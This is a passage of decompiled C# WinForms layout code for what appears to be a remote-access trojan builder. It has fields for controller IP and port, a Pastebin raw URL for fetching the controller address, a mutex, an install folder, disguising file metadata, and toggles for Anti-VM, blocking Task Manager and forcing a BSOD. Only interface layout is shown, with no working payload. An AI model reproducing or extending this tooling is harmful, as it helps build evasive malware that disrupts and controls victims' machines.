        this.label3.AutoSize = true;
        this.label3.ForeColor = System.Drawing.Color.White;
        this.label3.Location = new System.Drawing.Point(11, 157);
        this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(69, 21);
        this.label3.TabIndex = 97;
        this.label3.Text = "File path";
        this.label4.AutoSize = true;
        this.label4.ForeColor = System.Drawing.Color.White;
        this.label4.Location = new System.Drawing.Point(11, 120);
        this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label4.Name = "label4";
        this.label4.Size = new System.Drawing.Size(77, 21);
        this.label4.TabIndex = 98;
        this.label4.Text = "File name";
        this.txtIcon.Enabled = false;
        this.txtIcon.Location = new System.Drawing.Point(711, 219);
        this.txtIcon.Margin = new System.Windows.Forms.Padding(2);
        this.txtIcon.Name = "txtIcon";
        this.txtIcon.Size = new System.Drawing.Size(205, 29);
        this.txtIcon.TabIndex = 93;
        this.picIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        this.picIcon.ErrorImage = null;
        this.picIcon.InitialImage = null;
        this.picIcon.Location = new System.Drawing.Point(586, 5);
        this.picIcon.Margin = new System.Windows.Forms.Padding(2);
        this.picIcon.Name = "picIcon";
        this.picIcon.Size = new System.Drawing.Size(110, 89);
        this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.picIcon.TabIndex = 91;
        this.picIcon.TabStop = false;
        this.label14.AutoSize = true;
        this.label14.ForeColor = System.Drawing.Color.White;
        this.label14.Location = new System.Drawing.Point(13, 245);
        this.label14.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label14.Name = "label14";
        this.label14.Size = new System.Drawing.Size(65, 21);
        this.label14.TabIndex = 82;
        this.label14.Text = "Version:";
        this.label13.AutoSize = true;
        this.label13.ForeColor = System.Drawing.Color.White;
        this.label13.Location = new System.Drawing.Point(13, 274);
        this.label13.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label13.Name = "label13";
        this.label13.Size = new System.Drawing.Size(93, 21);
        this.label13.TabIndex = 81;
        this.label13.Text = "File Version:";
        this.label12.AutoSize = true;
        this.label12.ForeColor = System.Drawing.Color.White;
        this.label12.Location = new System.Drawing.Point(13, 216);
        this.label12.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label12.Name = "label12";
        this.label12.Size = new System.Drawing.Size(76, 21);
        this.label12.TabIndex = 80;
        this.label12.Text = "Filename:";
        this.label11.AutoSize = true;
        this.label11.ForeColor = System.Drawing.Color.White;
        this.label11.Location = new System.Drawing.Point(13, 187);
        this.label11.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label11.Name = "label11";
        this.label11.Size = new System.Drawing.Size(94, 21);
        this.label11.TabIndex = 79;
        this.label11.Text = "Trademarks:";
        this.label10.AutoSize = true;
        this.label10.ForeColor = System.Drawing.Color.White;
        this.label10.Location = new System.Drawing.Point(13, 158);
        this.label10.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label10.Name = "label10";
        this.label10.Size = new System.Drawing.Size(82, 21);
        this.label10.TabIndex = 78;
        this.label10.Text = "Copyright:";
        this.label9.AutoSize = true;
        this.label9.ForeColor = System.Drawing.Color.White;
        this.label9.Location = new System.Drawing.Point(12, 129);
        this.label9.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label9.Name = "label9";
        this.label9.Size = new System.Drawing.Size(80, 21);
        this.label9.TabIndex = 77;
        this.label9.Text = "Company:";
        this.label7.AutoSize = true;
        this.label7.ForeColor = System.Drawing.Color.White;
        this.label7.Location = new System.Drawing.Point(11, 101);
        this.label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label7.Name = "label7";
        this.label7.Size = new System.Drawing.Size(92, 21);
        this.label7.TabIndex = 75;
        this.label7.Text = "Description:";
        this.label8.AutoSize = true;
        this.label8.ForeColor = System.Drawing.Color.White;
        this.label8.Location = new System.Drawing.Point(13, 70);
        this.label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label8.Name = "label8";
        this.label8.Size = new System.Drawing.Size(67, 21);
        this.label8.TabIndex = 73;
        this.label8.Text = "Product:";
        this.label2.AutoSize = true;
        this.label2.Font = new System.Drawing.Font("Cascadia Code", 9.75f);
        this.label2.ForeColor = System.Drawing.Color.White;
        this.label2.Location = new System.Drawing.Point(9, 88);
        this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(48, 17);
        this.label2.TabIndex = 61;
        this.label2.Text = "Port:";
        this.label1.AutoSize = true;
        this.label1.Font = new System.Drawing.Font("Cascadia Code", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label1.ForeColor = System.Drawing.Color.White;
        this.label1.Location = new System.Drawing.Point(18, 52);
        this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(72, 17);
        this.label1.TabIndex = 68;
        this.label1.Text = "IP/HOST:";
        this.RemovePort.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.RemovePort.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.btnRemovePort });
        this.RemovePort.Name = "guna2ContextMenuStrip1";
        this.RemovePort.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(192, 0, 0);
        this.RemovePort.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.RemovePort.RenderStyle.ColorTable = null;
        this.RemovePort.RenderStyle.RoundedEdges = true;
        this.RemovePort.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
        this.RemovePort.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(100, 88, 255);
        this.RemovePort.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
        this.RemovePort.RenderStyle.SeparatorColor = System.Drawing.Color.DarkRed;
        this.RemovePort.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
        this.RemovePort.Size = new System.Drawing.Size(108, 26);
        this.btnRemovePort.ForeColor = System.Drawing.Color.White;
        this.btnRemovePort.Image = (System.Drawing.Image)resources.GetObject("btnRemovePort.Image");
        this.btnRemovePort.Name = "btnRemovePort";
        this.btnRemovePort.Size = new System.Drawing.Size(107, 22);
        this.btnRemovePort.Text = "Delete";
        this.btnRemovePort.Click += new System.EventHandler(BtnRemovePort_Click);
        this.hopeTabPage1.BaseColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.hopeTabPage1.Controls.Add(this.Connection);
        this.hopeTabPage1.Controls.Add(this.tabPage1);
        this.hopeTabPage1.Controls.Add(this.tabPage2);
        this.hopeTabPage1.Controls.Add(this.tabPage4);
        this.hopeTabPage1.Controls.Add(this.tabPage3);
        this.hopeTabPage1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.hopeTabPage1.ForeColorA = System.Drawing.Color.Silver;
        this.hopeTabPage1.ForeColorB = System.Drawing.Color.Silver;
        this.hopeTabPage1.ForeColorC = System.Drawing.Color.Black;
        this.hopeTabPage1.ItemSize = new System.Drawing.Size(120, 40);
        this.hopeTabPage1.Location = new System.Drawing.Point(0, 42);
        this.hopeTabPage1.Name = "hopeTabPage1";
        this.hopeTabPage1.SelectedIndex = 0;
        this.hopeTabPage1.Size = new System.Drawing.Size(701, 402);
        this.hopeTabPage1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
        this.hopeTabPage1.TabIndex = 114;
        this.hopeTabPage1.ThemeColorA = System.Drawing.Color.Silver;
        this.hopeTabPage1.ThemeColorB = System.Drawing.Color.Black;
        this.hopeTabPage1.TitleTextState = ReaLTaiizor.Controls.HopeTabPage.TextState.Normal;
        this.Connection.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.Connection.Controls.Add(this.guna2GroupBox1);
        this.Connection.Location = new System.Drawing.Point(0, 40);
        this.Connection.Name = "Connection";
        this.Connection.Padding = new System.Windows.Forms.Padding(3);
        this.Connection.Size = new System.Drawing.Size(701, 362);
        this.Connection.TabIndex = 2;
        this.Connection.Text = "Connection";
        this.guna2GroupBox1.BorderColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2GroupBox1.Controls.Add(this.listBoxIP);
        this.guna2GroupBox1.Controls.Add(this.listBoxPort);
        this.guna2GroupBox1.Controls.Add(this.guna2Button1);
        this.guna2GroupBox1.Controls.Add(this.label18);
        this.guna2GroupBox1.Controls.Add(this.label25);
        this.guna2GroupBox1.Controls.Add(this.chkPaste_bin);
        this.guna2GroupBox1.Controls.Add(this.label15);
        this.guna2GroupBox1.Controls.Add(this.txtPaste_bin);
        this.guna2GroupBox1.Controls.Add(this.textPort);
        this.guna2GroupBox1.Controls.Add(this.label1);
        this.guna2GroupBox1.Controls.Add(this.btnAddIP);
        this.guna2GroupBox1.Controls.Add(this.label2);
        this.guna2GroupBox1.Controls.Add(this.textIP);
        this.guna2GroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(30, 32, 35);
        this.guna2GroupBox1.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2GroupBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2GroupBox1.ForeColor = System.Drawing.Color.FromArgb(125, 137, 149);
        this.guna2GroupBox1.Location = new System.Drawing.Point(18, 14);
        this.guna2GroupBox1.Name = "guna2GroupBox1";
        this.guna2GroupBox1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 64, 64);
        this.guna2GroupBox1.ShadowDecoration.Enabled = true;
        this.guna2GroupBox1.Size = new System.Drawing.Size(667, 334);
        this.guna2GroupBox1.TabIndex = 142;
        this.guna2GroupBox1.Text = "HOST | PORT";
        this.listBoxIP.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
        this.listBoxIP.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.listBoxIP.ContextMenuStrip = this.ipremove;
        this.listBoxIP.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.listBoxIP.FormattingEnabled = true;
        this.listBoxIP.ItemHeight = 15;
        this.listBoxIP.Location = new System.Drawing.Point(19, 146);
        this.listBoxIP.Margin = new System.Windows.Forms.Padding(2, 0, 2, 2);
        this.listBoxIP.Name = "listBoxIP";
        this.listBoxIP.Size = new System.Drawing.Size(241, 75);
        this.listBoxIP.TabIndex = 157;
        this.ipremove.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.ipremove.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.btnRemoveIP });
        this.ipremove.Name = "guna2ContextMenuStrip1";
        this.ipremove.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(192, 0, 0);
        this.ipremove.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.ipremove.RenderStyle.ColorTable = null;
        this.ipremove.RenderStyle.RoundedEdges = true;
        this.ipremove.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
        this.ipremove.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(100, 88, 255);
        this.ipremove.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
        this.ipremove.RenderStyle.SeparatorColor = System.Drawing.Color.DarkRed;
        this.ipremove.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
        this.ipremove.Size = new System.Drawing.Size(108, 26);
        this.ipremove.Opening += new System.ComponentModel.CancelEventHandler(ipremove_Opening);
        this.btnRemoveIP.ForeColor = System.Drawing.Color.White;
        this.btnRemoveIP.Image = (System.Drawing.Image)resources.GetObject("btnRemoveIP.Image");
        this.btnRemoveIP.Name = "btnRemoveIP";
        this.btnRemoveIP.Size = new System.Drawing.Size(107, 22);
        this.btnRemoveIP.Text = "Delete";
        this.btnRemoveIP.Click += new System.EventHandler(BtnRemoveIP_Click);
        this.listBoxPort.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
        this.listBoxPort.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.listBoxPort.ContextMenuStrip = this.RemovePort;
        this.listBoxPort.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.listBoxPort.FormattingEnabled = true;
        this.listBoxPort.ItemHeight = 15;
        this.listBoxPort.Location = new System.Drawing.Point(305, 146);
        this.listBoxPort.Margin = new System.Windows.Forms.Padding(2, 0, 2, 2);
        this.listBoxPort.Name = "listBoxPort";
        this.listBoxPort.Size = new System.Drawing.Size(241, 75);
        this.listBoxPort.TabIndex = 156;
        this.guna2Button1.Animated = true;
        this.guna2Button1.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button1.BorderColor = System.Drawing.Color.DimGray;
        this.guna2Button1.BorderRadius = 9;
        this.guna2Button1.CustomBorderColor = System.Drawing.Color.DimGray;
        this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.guna2Button1.ForeColor = System.Drawing.Color.White;
        this.guna2Button1.Location = new System.Drawing.Point(191, 82);
        this.guna2Button1.Name = "guna2Button1";
        this.guna2Button1.PressedColor = System.Drawing.Color.Snow;
        this.guna2Button1.ShadowDecoration.BorderRadius = 10;
        this.guna2Button1.ShadowDecoration.Color = System.Drawing.Color.Gray;
        this.guna2Button1.ShadowDecoration.Depth = 10;
        this.guna2Button1.ShadowDecoration.Enabled = true;
        this.guna2Button1.Size = new System.Drawing.Size(90, 29);
        this.guna2Button1.TabIndex = 155;
        this.guna2Button1.Text = "Add Port";
        this.guna2Button1.Click += new System.EventHandler(guna2Button1_Click);
        this.label18.BackColor = System.Drawing.Color.FromArgb(32, 32, 37);
        this.label18.ForeColor = System.Drawing.Color.LightGray;
        this.label18.Location = new System.Drawing.Point(302, 129);
        this.label18.Name = "label18";
        this.label18.Size = new System.Drawing.Size(244, 15);
        this.label18.TabIndex = 154;
        this.label18.Text = "PORT                                                                                            ";
        this.label25.BackColor = System.Drawing.Color.FromArgb(32, 32, 37);
        this.label25.ForeColor = System.Drawing.Color.LightGray;
        this.label25.Location = new System.Drawing.Point(19, 127);
        this.label25.Name = "label25";
        this.label25.Size = new System.Drawing.Size(240, 15);
        this.label25.TabIndex = 153;
        this.label25.Text = "IP                                                                                          ";
        this.chkPaste_bin.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.chkPaste_bin.Location = new System.Drawing.Point(19, 247);
        this.chkPaste_bin.Name = "chkPaste_bin";
        this.chkPaste_bin.Size = new System.Drawing.Size(40, 22);
        this.chkPaste_bin.TabIndex = 128;
        this.chkPaste_bin.Text = "off";
        this.chkPaste_bin.CheckedChanged += new System.EventHandler(CheckBox2_CheckedChanged);
        this.label15.AutoSize = true;
        this.label15.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.label15.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label15.ForeColor = System.Drawing.Color.Honeydew;
        this.label15.Location = new System.Drawing.Point(65, 250);
        this.label15.Name = "label15";
        this.label15.Size = new System.Drawing.Size(61, 19);
        this.label15.TabIndex = 127;
        this.label15.Text = "IP | RAW";
        this.txtPaste_bin.Animated = true;
        this.txtPaste_bin.BackColor = System.Drawing.Color.Transparent;
        this.txtPaste_bin.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtPaste_bin.BorderRadius = 5;
        this.txtPaste_bin.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtPaste_bin.DefaultText = "https://pastebin.com/raw/UTPHT9Xx";
        this.txtPaste_bin.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtPaste_bin.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtPaste_bin.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtPaste_bin.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtPaste_bin.Enabled = false;
        this.txtPaste_bin.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtPaste_bin.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtPaste_bin.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtPaste_bin.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtPaste_bin.Location = new System.Drawing.Point(20, 282);
        this.txtPaste_bin.Name = "txtPaste_bin";
        this.txtPaste_bin.PasswordChar = '\0';
        this.txtPaste_bin.PlaceholderText = "";
        this.txtPaste_bin.SelectedText = "";
        this.txtPaste_bin.SelectionStart = 33;
        this.txtPaste_bin.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtPaste_bin.ShadowDecoration.Depth = 10;
        this.txtPaste_bin.ShadowDecoration.Enabled = true;
        this.txtPaste_bin.Size = new System.Drawing.Size(327, 23);
        this.txtPaste_bin.TabIndex = 133;
        this.textPort.Animated = true;
        this.textPort.BackColor = System.Drawing.Color.Transparent;
        this.textPort.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.textPort.BorderRadius = 5;
        this.textPort.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.textPort.DefaultText = "";
        this.textPort.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.textPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.textPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.textPort.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.textPort.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.textPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.textPort.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.textPort.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.textPort.Location = new System.Drawing.Point(57, 86);
        this.textPort.Name = "textPort";
        this.textPort.PasswordChar = '\0';
        this.textPort.PlaceholderText = "";
        this.textPort.SelectedText = "";
        this.textPort.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.textPort.ShadowDecoration.Depth = 10;
        this.textPort.ShadowDecoration.Enabled = true;
        this.textPort.Size = new System.Drawing.Size(127, 23);
        this.textPort.TabIndex = 131;
        this.btnAddIP.Animated = true;
        this.btnAddIP.BackColor = System.Drawing.Color.Transparent;
        this.btnAddIP.BorderColor = System.Drawing.Color.DimGray;
        this.btnAddIP.BorderRadius = 9;
        this.btnAddIP.CustomBorderColor = System.Drawing.Color.DimGray;
        this.btnAddIP.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.btnAddIP.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.btnAddIP.ForeColor = System.Drawing.Color.White;
        this.btnAddIP.Location = new System.Drawing.Point(391, 47);
        this.btnAddIP.Name = "btnAddIP";
        this.btnAddIP.PressedColor = System.Drawing.Color.Snow;
        this.btnAddIP.ShadowDecoration.BorderRadius = 10;
        this.btnAddIP.ShadowDecoration.Color = System.Drawing.Color.Gray;
        this.btnAddIP.ShadowDecoration.Depth = 10;
        this.btnAddIP.ShadowDecoration.Enabled = true;
        this.btnAddIP.Size = new System.Drawing.Size(75, 29);
        this.btnAddIP.TabIndex = 140;
        this.btnAddIP.Text = "Add IP";
        this.btnAddIP.Click += new System.EventHandler(BtnAddIP_Click);
        this.textIP.Animated = true;
        this.textIP.BackColor = System.Drawing.Color.Transparent;
        this.textIP.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.textIP.BorderRadius = 5;
        this.textIP.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.textIP.DefaultText = "";
        this.textIP.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.textIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.textIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.textIP.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.textIP.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.textIP.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.textIP.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.textIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.textIP.Location = new System.Drawing.Point(100, 50);
        this.textIP.Name = "textIP";
        this.textIP.PasswordChar = '\0';
        this.textIP.PlaceholderText = "";
        this.textIP.SelectedText = "";
        this.textIP.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.textIP.ShadowDecoration.Depth = 10;
        this.textIP.ShadowDecoration.Enabled = true;
        this.textIP.Size = new System.Drawing.Size(287, 23);
        this.textIP.TabIndex = 130;
        this.tabPage1.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.tabPage1.Controls.Add(this.chkAnti);
        this.tabPage1.Controls.Add(this.label21);
        this.tabPage1.Controls.Add(this.chkAntiProcess);
        this.tabPage1.Controls.Add(this.label20);
        this.tabPage1.Controls.Add(this.chkBsod);
        this.tabPage1.Controls.Add(this.label19);
        this.tabPage1.Controls.Add(this.numDelay);
        this.tabPage1.Controls.Add(this.comboBoxFolder);
        this.tabPage1.Controls.Add(this.textFilename);
        this.tabPage1.Controls.Add(this.checkBox1);
        this.tabPage1.Controls.Add(this.label6);
        this.tabPage1.Controls.Add(this.txtGroup);
        this.tabPage1.Controls.Add(this.button1);
        this.tabPage1.Controls.Add(this.txtMutex);
        this.tabPage1.Controls.Add(this.label4);
        this.tabPage1.Controls.Add(this.label3);
        this.tabPage1.Controls.Add(this.label17);
        this.tabPage1.Controls.Add(this.label16);
        this.tabPage1.Controls.Add(this.label5);
        this.tabPage1.Location = new System.Drawing.Point(0, 40);
        this.tabPage1.Name = "tabPage1";
        this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
        this.tabPage1.Size = new System.Drawing.Size(701, 362);
        this.tabPage1.TabIndex = 0;
        this.tabPage1.Text = "Settings";
        this.tabPage1.Click += new System.EventHandler(tabPage1_Click);
        this.chkAnti.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.chkAnti.Location = new System.Drawing.Point(15, 324);
        this.chkAnti.Name = "chkAnti";
        this.chkAnti.Size = new System.Drawing.Size(38, 22);
        this.chkAnti.TabIndex = 139;
        this.chkAnti.Text = "off";
        this.label21.AutoSize = true;
        this.label21.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.label21.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label21.ForeColor = System.Drawing.Color.Honeydew;
        this.label21.Location = new System.Drawing.Point(59, 326);
        this.label21.Name = "label21";
        this.label21.Size = new System.Drawing.Size(62, 19);
        this.label21.TabIndex = 138;
        this.label21.Text = "Anti-VM";
        this.chkAntiProcess.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.chkAntiProcess.Location = new System.Drawing.Point(15, 287);
        this.chkAntiProcess.Name = "chkAntiProcess";
        this.chkAntiProcess.Size = new System.Drawing.Size(38, 22);
        this.chkAntiProcess.TabIndex = 137;
        this.chkAntiProcess.Text = "off";
        this.label20.AutoSize = true;
        this.label20.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.label20.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label20.ForeColor = System.Drawing.Color.Honeydew;
        this.label20.Location = new System.Drawing.Point(59, 290);
        this.label20.Name = "label20";
        this.label20.Size = new System.Drawing.Size(95, 19);
        this.label20.TabIndex = 136;
        this.label20.Text = "Block taskmgr";
        this.chkBsod.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.chkBsod.Location = new System.Drawing.Point(15, 245);
        this.chkBsod.Name = "chkBsod";
        this.chkBsod.Size = new System.Drawing.Size(38, 22);
        this.chkBsod.TabIndex = 135;
        this.chkBsod.Text = "off";
        this.label19.AutoSize = true;
        this.label19.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.label19.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label19.ForeColor = System.Drawing.Color.Honeydew;
        this.label19.Location = new System.Drawing.Point(59, 248);
        this.label19.Name = "label19";
        this.label19.Size = new System.Drawing.Size(45, 19);
        this.label19.TabIndex = 134;
        this.label19.Text = "BSOD";
        this.numDelay.BackColor = System.Drawing.Color.Transparent;
        this.numDelay.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.numDelay.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.numDelay.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.numDelay.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.numDelay.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.numDelay.DisabledState.UpDownButtonFillColor = System.Drawing.Color.FromArgb(177, 177, 177);
        this.numDelay.DisabledState.UpDownButtonForeColor = System.Drawing.Color.FromArgb(203, 203, 203);
        this.numDelay.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.numDelay.FocusedState.BorderColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.numDelay.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.numDelay.ForeColor = System.Drawing.Color.FromArgb(126, 137, 149);
        this.numDelay.Location = new System.Drawing.Point(93, 192);
        this.numDelay.Maximum = new decimal(new int[4] { 999, 0, 0, 0 });
        this.numDelay.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
        this.numDelay.Name = "numDelay";
        this.numDelay.Size = new System.Drawing.Size(56, 25);
        this.numDelay.TabIndex = 126;
        this.numDelay.UpDownButtonFillColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.numDelay.Value = new decimal(new int[4] { 1, 0, 0, 0 });
        this.comboBoxFolder.BackColor = System.Drawing.Color.Transparent;
        this.comboBoxFolder.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.comboBoxFolder.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.comboBoxFolder.DropDownWidth = 162;
        this.comboBoxFolder.Enabled = false;
        this.comboBoxFolder.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.comboBoxFolder.FocusedColor = System.Drawing.Color.Empty;
        this.comboBoxFolder.Font = new System.Drawing.Font("Segoe UI", 10f);
        this.comboBoxFolder.ForeColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.comboBoxFolder.FormattingEnabled = true;
        this.comboBoxFolder.ItemHeight = 16;
        this.comboBoxFolder.Items.AddRange(new object[2] { "%AppData%", "%Temp%" });
        this.comboBoxFolder.Location = new System.Drawing.Point(93, 157);
        this.comboBoxFolder.Name = "comboBoxFolder";
        this.comboBoxFolder.Size = new System.Drawing.Size(188, 22);
        this.comboBoxFolder.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
        this.comboBoxFolder.TabIndex = 125;
        this.textFilename.Animated = true;
        this.textFilename.BackColor = System.Drawing.Color.Transparent;
        this.textFilename.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.textFilename.BorderRadius = 5;
        this.textFilename.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.textFilename.DefaultText = "";
        this.textFilename.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.textFilename.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.textFilename.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.textFilename.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.textFilename.Enabled = false;
        this.textFilename.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.textFilename.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.textFilename.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.textFilename.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.textFilename.Location = new System.Drawing.Point(93, 120);
        this.textFilename.Name = "textFilename";
        this.textFilename.PasswordChar = '\0';
        this.textFilename.PlaceholderText = "";
        this.textFilename.SelectedText = "";
        this.textFilename.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.textFilename.ShadowDecoration.Depth = 10;
        this.textFilename.ShadowDecoration.Enabled = true;
        this.textFilename.Size = new System.Drawing.Size(188, 23);
        this.textFilename.TabIndex = 124;
        this.checkBox1.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.checkBox1.Location = new System.Drawing.Point(15, 85);
        this.checkBox1.Name = "checkBox1";
        this.checkBox1.Size = new System.Drawing.Size(38, 22);
        this.checkBox1.TabIndex = 123;
        this.checkBox1.Text = "off";
        this.checkBox1.CheckedChanged += new System.EventHandler(checkBox1_CheckedChanged);
        this.label6.AutoSize = true;
        this.label6.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.label6.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label6.ForeColor = System.Drawing.Color.Honeydew;
        this.label6.Location = new System.Drawing.Point(58, 87);
